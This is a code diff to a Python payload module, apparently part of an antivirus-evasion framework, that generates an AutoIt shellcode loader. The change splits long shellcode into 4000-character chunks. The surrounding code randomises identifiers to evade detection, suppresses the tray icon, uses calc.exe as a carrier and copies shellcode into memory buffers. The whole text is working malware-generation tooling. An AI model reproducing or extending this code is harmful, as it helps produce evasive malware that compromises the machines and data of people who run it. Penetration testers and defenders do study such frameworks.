@@ -56,18 +56,30 @@ class PayloadModule:
 
         # get it in AutoITs format
         Shellcode = "0x" + "".join(Shellcode.split("\\x"))
+        total_size = len(Shellcode)
 
         RandFuncName = evasion_helpers.randomString()
         RandArgName = evasion_helpers.randomString()
         RandASMVarName = evasion_helpers.randomString()
         RandASMBufferName = evasion_helpers.randomString()
         RandBinBufferName = evasion_helpers.randomString()
+        length_limit = 4000
 
         # keep that pesky tray icon from appearing
         payload_code = "#NoTrayIcon\n"
         payload_code += RandFuncName + '(fileread("%WinDir%\\system32\\calc.exe"))\n'
         payload_code += 'Func ' + RandFuncName + '($' + RandArgName + ')\n'
-        payload_code += '\tLocal $' + RandASMVarName + '="' + Shellcode + '"\n'
+        if total_size > length_limit:
+            all_lines = [Shellcode[i:i+length_limit] for i in range(0, len(Shellcode), length_limit)]
+            first_run = True
+            for line in all_lines:
+                if first_run:
+                    payload_code += '\tLocal $' + RandASMVarName + '="' + line + '"\n'
+                    first_run = False
+                else:
+                    payload_code += '\t$' + RandASMVarName + ' = $' + RandASMVarName + ' & "' + line + '"\n'
+        else:
+            payload_code += '\tLocal $' + RandASMVarName + '="' + Shellcode + '"\n'
         payload_code += '\tLocal $' + RandASMBufferName + ' = DllStructCreate("byte[" & BinaryLen($' + RandASMVarName + ') & "]")\n'
         payload_code += '\tLocal $' + RandBinBufferName + ' = DllStructCreate("byte[" & BinaryLen($' + RandArgName + ') & "]")\n'
         payload_code += '\tDllStructSetData($' + RandASMBufferName + ', 1, $' + RandASMVarName + ')\n'
